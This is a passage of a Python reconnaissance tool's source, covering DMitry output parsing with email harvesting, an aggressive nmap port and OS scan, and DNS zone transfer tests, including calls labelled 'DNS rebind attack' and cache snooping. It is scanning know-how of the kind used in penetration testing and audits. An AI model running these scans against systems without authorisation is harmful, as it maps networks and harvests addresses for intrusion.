                            print(f"{Colors.CYAN}      📧 {line}{Colors.RESET}")
                            email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', line)
                            if email_match:
                                all_emails.append(email_match.group())
                        
                        # IP Address
                        elif 'IP Address' in line or 'ip address' in line.lower():
                            print(f"{Colors.BLUE}      📍 {line}{Colors.RESET}")
                            ip_match = re.search(r'[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+', line)
                            if ip_match:
                                all_ips.append(ip_match.group())
                        
                        # Country
                        elif 'Country' in line or 'country' in line.lower():
                            print(f"{Colors.MAGENTA}      🌍 {line}{Colors.RESET}")
                        
                        # Server/OS
                        elif 'Server' in line or 'server' in line.lower() or 'OS' in line or 'os' in line.lower():
                            print(f"{Colors.YELLOW}      🖥️  {line}{Colors.RESET}")
                            all_server_info.append(line)
                        
                        # Domain/Registrar
                        elif 'Domain' in line or 'domain' in line.lower() or 'Registrar' in line:
                            print(f"{Colors.BLUE}      📋 {line}{Colors.RESET}")
                            if 'Domain' in line:
                                domain_match = re.search(r'Domain(?: Name)?:\s*([a-zA-Z0-9.-]+)', line, re.I)
                                if domain_match:
                                    all_domains.append(domain_match.group(1))
                        
                        # Error
                        elif 'error' in line.lower() or 'fail' in line.lower() or 'not found' in line.lower():
                            print(f"{Colors.RED}      ❌ {line}{Colors.RESET}")
                        
                        # Warning
                        elif 'warning' in line.lower():
                            print(f"{Colors.YELLOW}      ⚠️ {line}{Colors.RESET}")
                        
                        # Scanning progress
                        elif 'Scanning' in line or 'scanning' in line.lower() or 'Searching' in line:
                            print(f"{Colors.CYAN}      🔍 {line}{Colors.RESET}")
                        
                        # Found results
                        elif 'Found' in line and ('email' in line.lower() or 'port' in line.lower()):
                            print(f"{Colors.GREEN}      ✅ {line}{Colors.RESET}")
                        
                        # Netcraft info
                        elif 'Netcraft' in line:
                            print(f"{Colors.CYAN}      🌐 {line}{Colors.RESET}")
                        
                        # Default - show as is
                        else:
                            if line.strip():
                                print(f"      {line}")
                        
                        sys.stdout.flush()

                elapsed = time.time() - start_time
                
                # Check if output file was created
                if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                    print(f"{Colors.GREEN}   ✅ Completed ({elapsed:.2f}s){Colors.RESET}")
                    print(f"{Colors.CYAN}   📁 Saved: {output_file}{Colors.RESET}")
                    successful += 1
                else:
                    # If tee failed, try direct redirection
                    fallback_cmd = f"{cmd} > {output_file} 2>&1"
                    if self.use_proxy:
                        fallback_cmd = f"{self.proxy_prefix} {fallback_cmd}"
                    
                    print(f"{Colors.YELLOW}   ⚠️ Tee failed, trying direct redirection...{Colors.RESET}")
                    result = subprocess.run(fallback_cmd, shell=True, capture_output=True, text=True, timeout=60)
                    
                    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                        print(f"{Colors.GREEN}   ✅ Completed ({elapsed:.2f}s){Colors.RESET}")
                        print(f"{Colors.CYAN}   📁 Saved: {output_file}{Colors.RESET}")
                        successful += 1
                    else:
                        print(f"{Colors.RED}   ❌ Failed to save output{Colors.RESET}")

            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}   ❌ Timeout (60s){Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}   ❌ Error: {str(e)[:100]}{Colors.RESET}")

            # Small delay between tests
            time.sleep(0.3)

        # ============================================================
        # DMITRY COMPLETE SUMMARY
        # ============================================================
        
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 DMITRY - COMPLETE SCAN SUMMARY{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}Total tests: {total}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Successful: {successful}{Colors.RESET}")
        print(f"{Colors.RED}❌ Failed: {total - successful}{Colors.RESET}")

        # ===== IP Information =====
        if all_ips:
            all_ips = list(set(all_ips))
            print(f"\n{Colors.CYAN}📍 IP Addresses Found: {len(all_ips)}{Colors.RESET}")
            for ip in all_ips[:5]:
                print(f"{Colors.BLUE}   • {ip}{Colors.RESET}")
            self.ips.extend(all_ips)
            self.ips = list(set(self.ips))

        # ===== Domain Information =====
        if all_domains:
            all_domains = list(set(all_domains))
            print(f"\n{Colors.CYAN}📋 Domains Found:{Colors.RESET}")
            for domain in all_domains[:5]:
                print(f"{Colors.BLUE}   • {domain}{Colors.RESET}")

        # ===== Server Information =====
        if all_server_info:
            print(f"\n{Colors.CYAN}🖥️  Server Information:{Colors.RESET}")
            for info in all_server_info[:5]:
                print(f"{Colors.BLUE}   • {info}{Colors.RESET}")

        # ===== Emails Found =====
        if all_emails:
            all_emails = list(set(all_emails))
            print(f"\n{Colors.GREEN}📧 Total Emails Found: {len(all_emails)}{Colors.RESET}")
            for i, email in enumerate(all_emails[:15], 1):
                print(f"{Colors.BLUE}   {i}. {email}{Colors.RESET}")
            if len(all_emails) > 15:
                print(f"{Colors.YELLOW}   ... and {len(all_emails)-15} more{Colors.RESET}")
            
            # Save all emails
            with open(f"{self.results_dir}/dmitry_all_emails.txt", 'w') as f:
                for email in sorted(all_emails):
                    f.write(f"{email}\n")
            print(f"{Colors.CYAN}📁 All emails saved: {self.results_dir}/dmitry_all_emails.txt{Colors.RESET}")

        # ===== Open Ports =====
        if all_ports:
            all_ports = list(set(all_ports))
            print(f"\n{Colors.CYAN}🔓 Total Open Ports Found: {len(all_ports)}{Colors.RESET}")
            for port in sorted(all_ports):
                if port == 111:
                    print(f"{Colors.RED}   ⚠️ Port {port} - RPC (SECURITY RISK!){Colors.RESET}")
                else:
                    print(f"{Colors.GREEN}   ✅ Port {port} is open{Colors.RESET}")
            
            # Add to main open_ports
            self.open_ports.extend(all_ports)
            self.open_ports = list(set(self.open_ports))
            
            # Save ports
            with open(f"{self.results_dir}/dmitry_open_ports.txt", 'w') as f:
                for port in sorted(all_ports):
                    f.write(f"{port}\n")

        # ===== Create Combined Report =====
        combined_report = f"""DMITRY COMPLETE SCAN REPORT
    ========================================
    Target: {self.clean_target}
    Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    Proxy Used: {self.use_proxy}
    Total Tests: {total}
    Successful: {successful}

    ========================================
    SUMMARY
    ========================================
    IP Addresses: {len(all_ips)}
    Domains: {len(all_domains)}
    Emails Found: {len(all_emails)}
    Open Ports: {len(all_ports)}

    ========================================
    FILES GENERATED
    ========================================
    """
        for test in dmitry_tests:
            file_path = f"{dmitry_dir}/{test['output']}"
            if os.path.exists(file_path):
                size = os.path.getsize(file_path)
                combined_report += f"✅ {test['output']} ({size} bytes)\n"
            else:
                combined_report += f"❌ {test['output']} (Not created)\n"

        # Save combined report
        with open(f"{self.results_dir}/DMITRY_COMPLETE_REPORT.txt", 'w') as f:
            f.write(combined_report)

        print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Dmitry scan completed!{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Results saved in: {dmitry_dir}{Colors.RESET}")
        print(f"{Colors.CYAN}📄 Complete report: {self.results_dir}/DMITRY_COMPLETE_REPORT.txt{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        
        return successful





    def port_scan(self):
        print(f"\n{Colors.CYAN}🔍 SCANNING PORTS WITH NMAP{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        if not self.check_and_install_tool('nmap'):
            print(f"{Colors.RED}❌ Nmap not available, using Python socket fallback{Colors.RESET}")
            return self.fallback_port_scan()

        all_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
                     1723, 3306, 3389, 5432, 5900, 5984, 6379, 8000, 8080, 8443, 8888, 9200,
                     1433, 1521, 2082, 2083, 2086, 2087, 2095, 2096, 3000, 4000, 5000, 7000,
                     8088, 9000, 9090, 27017, 27018, 27019]
        
        port_string = ','.join(map(str, all_ports))
        print(f"{Colors.CYAN}📊 Scanning {len(all_ports)} ports...{Colors.RESET}")
        
        cmd = (f"nmap -p {port_string} "
               f"-sV -sC -O -A -T4 "
               f"--min-rate 1000 --max-retries 3 "
               f"--open -Pn -v "
               f"-oN {self.results_dir}/nmap_scan.txt "
               f"-oX {self.results_dir}/nmap_scan.xml "
               f"--dns-servers 8.8.8.8,1.1.1.1 "
               f"{self.clean_target}")
        
        print(f"{Colors.CYAN}🔍 Running Nmap scan (may take 2-5 minutes)...{Colors.RESET}")
        output = self.run_command(cmd, "NMAP Full Port Scan", use_proxy=False)
        
        open_ports = []
        if output:
            print(f"{Colors.GREEN}✅ Nmap scan completed{Colors.RESET}")
            print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")
            
            for line in output.split('\n'):
                if '/tcp' in line and 'open' in line:
                    try:
                        port = line.split('/')[0].strip()
                        service = line.split('open')[1].split(' ')[1] if 'open' in line else 'unknown'
                        print(f"{Colors.GREEN}   ✅ Port {port} is open ({service}){Colors.RESET}")
                        open_ports.append(int(port))
                    except:
                        pass
            
            if not open_ports:
                print(f"{Colors.YELLOW}⚠️ No open ports in text output, checking XML...{Colors.RESET}")
                open_ports = self.parse_nmap_xml()
            
            self.open_ports = open_ports
            with open(f"{self.results_dir}/open_ports.txt", 'w') as f:
                f.write(f"Target: {self.target}\n")
                f.write(f"Open ports found: {len(open_ports)}\n")
                f.write(f"Open ports: {', '.join(map(str, sorted(open_ports)))}\n\n")
                f.write("Full Nmap output:\n")
                f.write(output if output else "No output")
            
            if open_ports:
                print(f"\n{Colors.GREEN}✅ Found {len(open_ports)} open ports{Colors.RESET}")
                print(f"{Colors.BLUE}   Ports: {', '.join(map(str, sorted(open_ports)))}{Colors.RESET}")
            else:
                print(f"\n{Colors.YELLOW}⚠️ No open ports found{Colors.RESET}")
            return open_ports
        else:
            print(f"{Colors.YELLOW}⚠️ Nmap scan failed, using Python socket fallback{Colors.RESET}")
            return self.fallback_port_scan()

    def parse_nmap_xml(self):
        open_ports = []
        xml_file = f"{self.results_dir}/nmap_scan.xml"
        if os.path.exists(xml_file):
            try:
                with open(xml_file, 'r') as f:
                    content = f.read()
                    ports = re.findall(r'portid="(\d+)"', content)
                    for port in ports:
                        if f'<state state="open"' in content:
                            print(f"{Colors.GREEN}   ✅ Port {port} is open (from XML){Colors.RESET}")
                            open_ports.append(int(port))
            except:
                pass
        return open_ports

    def fallback_port_scan(self):
        print(f"{Colors.CYAN}🔍 Using Python socket scanning (fallback)...{Colors.RESET}")
        all_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389, 8080, 8443]
        open_ports = []
        for port in all_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.clean_target, port))
                if result == 0:
                    print(f"{Colors.GREEN}   ✅ Port {port} is open{Colors.RESET}")
                    open_ports.append(port)
                sock.close()
            except:
                pass
        self.open_ports = open_ports
        with open(f"{self.results_dir}/open_ports_fallback.txt", 'w') as f:
            f.write(f"Open ports: {', '.join(map(str, open_ports))}\n")
        return open_ports



    # ==================== ZONE TRANSFER TESTER ====================
    # ==================== ZONE TRANSFER TESTER - DEEP VERIFICATION ====================
    # ==================== ZONE TRANSFER HELPER FUNCTIONS ====================
    def get_nameservers(self):
        """Get nameservers for the target domain"""
        nameservers = []
        
        # Method 1: dig NS
        try:
            cmd = f"dig NS {self.clean_target} +short"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if line and '.' in line:
                        if line.endswith('.'):
                            line = line[:-1]
                        if line not in nameservers:
                            nameservers.append(line)
        except:
            pass
        
        # Method 2: nslookup
        if not nameservers:
            try:
                cmd = f"nslookup -type=NS {self.clean_target}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'nameserver =' in line.lower():
                            ns = line.split('=')[-1].strip()
                            if ns and ns not in nameservers:
                                if ns.endswith('.'):
                                    ns = ns[:-1]
                                nameservers.append(ns)
            except:
                pass
        
        nameservers = [ns for ns in nameservers if ns and '.' in ns]
        return list(set(nameservers))
    
    def get_nameservers_fallback(self):
        """Fallback method to get nameservers"""
        common_ns = [
            f"ns1.{self.clean_target}",
            f"ns2.{self.clean_target}",
            f"ns3.{self.clean_target}",
            f"dns1.{self.clean_target}",
            f"dns2.{self.clean_target}"
        ]
        
        nameservers = []
        for ns in common_ns:
            try:
                cmd = f"dig @8.8.8.8 {ns} A +short"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                if result.stdout.strip():
                    nameservers.append(ns)
            except:
                pass
        
        return nameservers
    
    def display_zone_records(self, records):
        """Display zone transfer records"""
        print(f"{Colors.CYAN}      📋 DNS Records:{Colors.RESET}")
        
        for record in records[:20]:
            if 'SOA' in record:
                print(f"{Colors.MAGENTA}         {record}{Colors.RESET}")
            elif 'NS' in record:
                print(f"{Colors.BLUE}         {record}{Colors.RESET}")
            elif 'A' in record and 'CNAME' not in record:
                print(f"{Colors.GREEN}         {record}{Colors.RESET}")
            elif 'CNAME' in record:
                print(f"{Colors.YELLOW}         {record}{Colors.RESET}")
            elif 'MX' in record:
                print(f"{Colors.CYAN}         {record}{Colors.RESET}")
            elif 'TXT' in record:
                print(f"{Colors.BLUE}         {record}{Colors.RESET}")
            else:
                print(f"         {record}")
        
        if len(records) > 20:
            print(f"{Colors.YELLOW}         ... and {len(records)-20} more records{Colors.RESET}")
    
    def save_zone_transfer_results(self, results, successful_count):
        """Save zone transfer results"""
        if not results:
            return
        
        output_file = f"{self.results_dir}/zone_transfer_results.txt"
        
        with open(output_file, 'w') as f:
            f.write(f"DNS ZONE TRANSFER TEST RESULTS\n")
            f.write(f"Target: {self.clean_target}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Successful Transfers: {successful_count}\n")
            f.write("="*70 + "\n\n")
            
            if successful_count > 0:
                f.write("⚠️  ⚠️  ⚠️  ZONE TRANSFER VULNERABILITY FOUND! ⚠️  ⚠️  ⚠️\n")
                f.write("This DNS server is MISCONFIGURED!\n")
                f.write("="*70 + "\n\n")
            
            for result in results:
                f.write(f"Nameserver: {result['nameserver']}\n")
                f.write(f"Method: {result['method']}\n")
                f.write(f"Records Found: {len(result['records'])}\n")
                f.write("-"*50 + "\n")
                
                for record in result['records']:
                    f.write(f"{record}\n")
                
                f.write("\n" + "="*70 + "\n\n")
        
        print(f"\n{Colors.CYAN}📁 Results saved: {output_file}{Colors.RESET}")
        
        json_file = f"{self.results_dir}/zone_transfer_results.json"
        with open(json_file, 'w') as f:
            json.dump({
                'target': self.clean_target,
                'timestamp': datetime.now().isoformat(),
                'successful_transfers': successful_count,
                'results': results
            }, f, indent=2)
        
        print(f"{Colors.CYAN}📁 JSON saved: {json_file}{Colors.RESET}")



    def run_zone_transfer_tests(self):
        """
        DNS Zone Transfer Testing - Complete Implementation with Deep Verification
        """
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}🌐 DNS ZONE TRANSFER TEST - COMPLETE IMPLEMENTATION{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        
        print(f"{Colors.CYAN}📖 What is Zone Transfer?{Colors.RESET}")
        print(f"{Colors.BLUE}   Zone Transfer (AXFR) is a DNS process that allows a{Colors.RESET}")
        print(f"{Colors.BLUE}   DNS server to copy the complete DNS records of a zone.{Colors.RESET}")
        print(f"{Colors.BLUE}   This is commonly used for synchronization between{Colors.RESET}")
        print(f"{Colors.BLUE}   primary and secondary DNS servers.{Colors.RESET}")
        print(f"{Colors.RED}   ⚠️  If someone can perform unauthorized Zone Transfer,{Colors.RESET}")
        print(f"{Colors.RED}   it becomes a CRITICAL security vulnerability!{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}")
        
        # ============ STEP 1: Get Nameservers ============
        print(f"\n{Colors.CYAN}📋 STEP 1: Getting Nameservers for {self.clean_target}{Colors.RESET}")
        nameservers = self.get_nameservers()
        
        if not nameservers:
            print(f"{Colors.RED}❌ No nameservers found for {self.clean_target}{Colors.RESET}")
            print(f"{Colors.YELLOW}💡 Trying fallback methods...{Colors.RESET}")
            nameservers = self.get_nameservers_fallback()
        
        if not nameservers:
            print(f"{Colors.RED}❌ Could not find any nameservers.{Colors.RESET}")
            print(f"{Colors.YELLOW}💡 Cannot perform zone transfer without nameservers.{Colors.RESET}")
            return False
        
        print(f"{Colors.GREEN}✅ Found {len(nameservers)} nameserver(s):{Colors.RESET}")
        for i, ns in enumerate(nameservers, 1):
            print(f"{Colors.BLUE}   {i}. {ns}{Colors.RESET}")
        
        # ============ STEP 2: Verify Nameserver Reachability ============
        print(f"\n{Colors.CYAN}📋 STEP 2: Verifying Nameserver Reachability{Colors.RESET}")
        print(f"{Colors.YELLOW}{'─'*70}{Colors.RESET}")
        
        reachable_ns = []
        for ns in nameservers:
            print(f"{Colors.BLUE}   Testing: {ns}{Colors.RESET}")
            if self.test_nameserver_reachability(ns):
                reachable_ns.append(ns)
                print(f"{Colors.GREEN}      ✅ Nameserver is reachable{Colors.RESET}")
            else:
                print(f"{Colors.RED}      ❌ Nameserver is NOT reachable{Colors.RESET}")
        
        if not reachable_ns:
            print(f"{Colors.RED}❌ No reachable nameservers found.{Colors.RESET}")
            return False
        
        nameservers = reachable_ns
        
        # ============ STEP 3: Test Zone Transfer with Multiple Methods ============
        print(f"\n{Colors.CYAN}📋 STEP 3: Testing Zone Transfer with Multiple Methods{Colors.RESET}")
        print(f"{Colors.YELLOW}{'─'*70}{Colors.RESET}")
        
        zone_transfer_results = []
        successful_transfers = 0
        
        for ns in nameservers:
            print(f"\n{Colors.CYAN}🔍 Testing Zone Transfer from: {ns}{Colors.RESET}")
            ns_results = []
            
            # ============ Method 1: DIG AXFR ============
            print(f"{Colors.BLUE}   Method 1: dig axfr @{ns} {self.clean_target}{Colors.RESET}")
            cmd1 = f"dig axfr @{ns} {self.clean_target}"
            result1, is_real_axfr = self.run_dig_zone_transfer_deep(cmd1, ns, "dig_axfr")
            
            if result1 and len(result1) > 1:
                successful_transfers += 1
                zone_transfer_results.append({
                    'nameserver': ns,
                    'method': 'dig axfr',
                    'records': result1,
                    'is_real_axfr': is_real_axfr
                })
                print(f"{Colors.GREEN}   ✅ Zone Transfer SUCCESSFUL from {ns}!{Colors.RESET}")
                print(f"{Colors.GREEN}   📊 Found {len(result1)} DNS records{Colors.RESET}")
                self.display_zone_records(result1)
                ns_results.append(('dig axfr', True, len(result1), is_real_axfr))
                continue
            
            # ============ Method 2: DIG AXFR with +short ============
            print(f"{Colors.BLUE}   Method 2: dig axfr @{ns} {self.clean_target} +short{Colors.RESET}")
            cmd2 = f"dig axfr @{ns} {self.clean_target} +short"
            result2, is_real_axfr = self.run_dig_zone_transfer_deep(cmd2, ns, "dig_axfr_short")
            
            if result2 and len(result2) > 1:
                successful_transfers += 1
                zone_transfer_results.append({
                    'nameserver': ns,
                    'method': 'dig axfr +short',
                    'records': result2,
                    'is_real_axfr': is_real_axfr
                })
                print(f"{Colors.GREEN}   ✅ Zone Transfer SUCCESSFUL from {ns}!{Colors.RESET}")
                print(f"{Colors.GREEN}   📊 Found {len(result2)} DNS records{Colors.RESET}")
                self.display_zone_records(result2)
                ns_results.append(('dig axfr +short', True, len(result2), is_real_axfr))
                continue
            
            # ============ Method 3: DIG AXFR with +multiline ============
            print(f"{Colors.BLUE}   Method 3: dig axfr @{ns} {self.clean_target} +multiline{Colors.RESET}")
            cmd3 = f"dig axfr @{ns} {self.clean_target} +multiline"
            result3, is_real_axfr = self.run_dig_zone_transfer_deep(cmd3, ns, "dig_axfr_multiline")
            
            if result3 and len(result3) > 1:
                successful_transfers += 1
                zone_transfer_results.append({
                    'nameserver': ns,
                    'method': 'dig axfr +multiline',
                    'records': result3,
                    'is_real_axfr': is_real_axfr
                })
                print(f"{Colors.GREEN}   ✅ Zone Transfer SUCCESSFUL from {ns}!{Colors.RESET}")
                print(f"{Colors.GREEN}   📊 Found {len(result3)} DNS records{Colors.RESET}")
                self.display_zone_records(result3)
                ns_results.append(('dig axfr +multiline', True, len(result3), is_real_axfr))
                continue
            
            # ============ Method 4: DIG AXFR with specific port ============
            print(f"{Colors.BLUE}   Method 4: dig axfr @{ns} {self.clean_target} -p 53{Colors.RESET}")
            cmd4 = f"dig axfr @{ns} {self.clean_target} -p 53"
            result4, is_real_axfr = self.run_dig_zone_transfer_deep(cmd4, ns, "dig_axfr_port53")
            
            if result4 and len(result4) > 1:
                successful_transfers += 1
                zone_transfer_results.append({
                    'nameserver': ns,
                    'method': 'dig axfr -p 53',
                    'records': result4,
                    'is_real_axfr': is_real_axfr
                })
                print(f"{Colors.GREEN}   ✅ Zone Transfer SUCCESSFUL from {ns}!{Colors.RESET}")
                print(f"{Colors.GREEN}   📊 Found {len(result4)} DNS records{Colors.RESET}")
                self.display_zone_records(result4)
                ns_results.append(('dig axfr -p 53', True, len(result4), is_real_axfr))
                continue
            
            # ============ Method 5: nslookup zone transfer ============
            print(f"{Colors.BLUE}   Method 5: nslookup -type=any {self.clean_target} {ns}{Colors.RESET}")
            cmd5 = f"nslookup -type=any {self.clean_target} {ns}"
            result5, is_real_axfr = self.run_nslookup_zone_transfer_deep(cmd5, ns)
            
            if result5 and len(result5) > 2:
                successful_transfers += 1
                zone_transfer_results.append({
                    'nameserver': ns,
                    'method': 'nslookup -type=any',
                    'records': result5,
                    'is_real_axfr': is_real_axfr
                })
                print(f"{Colors.GREEN}   ✅ Zone Transfer SUCCESSFUL from {ns}!{Colors.RESET}")
                print(f"{Colors.GREEN}   📊 Found {len(result5)} DNS records{Colors.RESET}")
                self.display_zone_records(result5)
                ns_results.append(('nslookup -type=any', True, len(result5), is_real_axfr))
                continue
            
            # ============ Method 6: Host -l zone transfer ============
            print(f"{Colors.BLUE}   Method 6: host -l {self.clean_target} {ns}{Colors.RESET}")
            cmd6 = f"host -l {self.clean_target} {ns}"
            result6, is_real_axfr = self.run_host_zone_transfer_deep(cmd6, ns)
            
            if result6 and len(result6) > 1:
                successful_transfers += 1
                zone_transfer_results.append({
                    'nameserver': ns,
                    'method': 'host -l',
                    'records': result6,
                    'is_real_axfr': is_real_axfr
                })
                print(f"{Colors.GREEN}   ✅ Zone Transfer SUCCESSFUL from {ns}!{Colors.RESET}")
                print(f"{Colors.GREEN}   📊 Found {len(result6)} DNS records{Colors.RESET}")
                self.display_zone_records(result6)
                ns_results.append(('host -l', True, len(result6), is_real_axfr))
                continue
            
            # ============ Method 7: Python DNS Library ============
            print(f"{Colors.BLUE}   Method 7: Python DNS library zone transfer{Colors.RESET}")
            result7, is_real_axfr = self.python_zone_transfer_deep(ns)
            
            if result7 and len(result7) > 1:
                successful_transfers += 1
                zone_transfer_results.append({
                    'nameserver': ns,
                    'method': 'python dns library',
                    'records': result7,
                    'is_real_axfr': is_real_axfr
                })
                print(f"{Colors.GREEN}   ✅ Zone Transfer SUCCESSFUL from {ns}!{Colors.RESET}")
                print(f"{Colors.GREEN}   📊 Found {len(result7)} DNS records{Colors.RESET}")
                self.display_zone_records(result7)
                ns_results.append(('python dns library', True, len(result7), is_real_axfr))
                continue
            
            print(f"{Colors.RED}   ❌ All zone transfer methods FAILED for {ns}{Colors.RESET}")
            print(f"{Colors.YELLOW}   ⚠️ This nameserver is properly configured (SECURE){Colors.RESET}")
            
            # ============ Method 8: DNS Rebind Attack Test ============
            print(f"{Colors.BLUE}   Method 8: DNS Rebind Attack Zone Transfer{Colors.RESET}")
            result8, is_real_axfr = self.test_dns_rebind_zone_transfer(ns)
            
            if result8 and len(result8) > 1:
                successful_transfers += 1
                zone_transfer_results.append({
                    'nameserver': ns,
                    'method': 'dns rebind attack',
                    'records': result8,
                    'is_real_axfr': is_real_axfr
                })
                print(f"{Colors.GREEN}   ✅ DNS Rebind Zone Transfer SUCCESSFUL from {ns}!{Colors.RESET}")
                print(f"{Colors.GREEN}   📊 Found {len(result8)} DNS records{Colors.RESET}")
                self.display_zone_records(result8)
                ns_results.append(('dns rebind attack', True, len(result8), is_real_axfr))
                continue
            
            # ============ Method 9: DNS Cache Snooping ============
            print(f"{Colors.BLUE}   Method 9: DNS Cache Snooping{Colors.RESET}")
            result9 = self.test_dns_cache_snooping(ns)
            
            if result9:
                print(f"{Colors.GREEN}   ✅ Cache snooping successful!{Colors.RESET}")
                zone_transfer_results.append({
                    'nameserver': ns,
                    'method': 'dns cache snooping',
                    'records': result9,
                    'is_real_axfr': False
                })
                ns_results.append(('dns cache snooping', True, len(result9), False))
                continue
        
        # ============ STEP 4: Deep Verification ============
        print(f"\n{Colors.CYAN}📋 STEP 4: Deep Verification of Zone Transfer{Colors.RESET}")
        print(f"{Colors.YELLOW}{'─'*70}{Colors.RESET}")
        
        real_zone_transfers = []
        false_positives = []
        
        for result in zone_transfer_results:
            if result['is_real_axfr']:
                real_zone_transfers.append(result)
            else:
                false_positives.append(result)
        
        print(f"\n{Colors.GREEN}🔍 REAL Zone Transfers: {len(real_zone_transfers)}{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️ False Positives: {len(false_positives)}{Colors.RESET}")
        
        if real_zone_transfers:
            print(f"\n{Colors.RED}⚠️  ⚠️  ⚠️  REAL ZONE TRANSFER VULNERABILITY CONFIRMED! ⚠️  ⚠️  ⚠️{Colors.RESET}")
            print(f"{Colors.RED}   This is a CRITICAL security issue!{Colors.RESET}")
            
            # ============ Extract Deep Information ============
            print(f"\n{Colors.CYAN}📊 Extracting Deep Information from Zone Transfer:{Colors.RESET}")
            
            for zt in real_zone_transfers:
                print(f"\n{Colors.MAGENTA}   Nameserver: {zt['nameserver']}{Colors.RESET}")
                print(f"{Colors.MAGENTA}   Method: {zt['method']}{Colors.RESET}")
                print(f"{Colors.MAGENTA}   Records Found: {len(zt['records'])}{Colors.RESET}")
                
                # Extract all subdomains
                subdomains = self.extract_subdomains_from_zone(zt['records'])
                if subdomains:
                    print(f"{Colors.GREEN}      Subdomains Found: {len(subdomains)}{Colors.RESET}")
                    for sub in subdomains[:10]:
                        print(f"{Colors.BLUE}         - {sub}{Colors.RESET}")
                
                # Extract all IPs
                ips = self.extract_ips_from_zone(zt['records'])
                if ips:
                    print(f"{Colors.GREEN}      IP Addresses Found: {len(ips)}{Colors.RESET}")
                    for ip in ips[:10]:
                        print(f"{Colors.BLUE}         - {ip}{Colors.RESET}")
                
                # Extract MX Records
                mx_records = self.extract_mx_from_zone(zt['records'])
                if mx_records:
                    print(f"{Colors.GREEN}      MX Records Found: {len(mx_records)}{Colors.RESET}")
                    for mx in mx_records[:5]:
                        print(f"{Colors.BLUE}         - {mx}{Colors.RESET}")
                
                # Extract TXT Records
                txt_records = self.extract_txt_from_zone(zt['records'])
                if txt_records:
                    print(f"{Colors.GREEN}      TXT Records Found: {len(txt_records)}{Colors.RESET}")
                    for txt in txt_records[:5]:
                        print(f"{Colors.BLUE}         - {txt}{Colors.RESET}")
                
                # Extract CNAME Records
                cname_records = self.extract_cname_from_zone(zt['records'])
                if cname_records:
                    print(f"{Colors.GREEN}      CNAME Records Found: {len(cname_records)}{Colors.RESET}")
                    for cname in cname_records[:5]:
                        print(f"{Colors.BLUE}         - {cname}{Colors.RESET}")
                
                # Check for internal IPs
                internal_ips = self.check_internal_ips(ips)
                if internal_ips:
                    print(f"{Colors.RED}      ⚠️ Internal IPs Found:{Colors.RESET}")
                    for ip in internal_ips:
                        print(f"{Colors.RED}         - {ip}{Colors.RESET}")
        
        # ============ STEP 5: Summary ============
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 ZONE TRANSFER TEST SUMMARY{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        
        total_tested = len(nameservers)
        print(f"{Colors.CYAN}Total nameservers tested: {total_tested}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Zone transfer successful: {successful_transfers}{Colors.RESET}")
        print(f"{Colors.RED}❌ Zone transfer failed/secure: {total_tested - successful_transfers}{Colors.RESET}")
        print(f"{Colors.CYAN}🔍 Real Zone Transfers: {len(real_zone_transfers)}{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️ False Positives: {len(false_positives)}{Colors.RESET}")
        
        if real_zone_transfers:
            print(f"\n{Colors.RED}⚠️  ⚠️  ⚠️  ZONE TRANSFER VULNERABILITY CONFIRMED! ⚠️  ⚠️  ⚠️{Colors.RESET}")
            print(f"{Colors.RED}   This DNS server is MISCONFIGURED!{Colors.RESET}")
            print(f"{Colors.RED}   Anyone can perform zone transfer and get ALL DNS records.{Colors.RESET}")
            print(f"{Colors.RED}   This is a CRITICAL security issue!{Colors.RESET}")
            
            print(f"\n{Colors.YELLOW}   🔴 RISKS:{Colors.RESET}")
            print(f"{Colors.YELLOW}   • All subdomains are exposed{Colors.RESET}")
            print(f"{Colors.YELLOW}   • Internal server IPs are revealed{Colors.RESET}")
            print(f"{Colors.YELLOW}   • Attackers can map your entire network{Colors.RESET}")
            print(f"{Colors.YELLOW}   • Email servers and configurations exposed{Colors.RESET}")
            print(f"{Colors.YELLOW}   • SPF/DKIM/DMARC records exposed{Colors.RESET}")
            print(f"{Colors.YELLOW}   • Easy reconnaissance for future attacks{Colors.RESET}")
            
            print(f"\n{Colors.GREEN}   ✅ RECOMMENDATIONS:{Colors.RESET}")
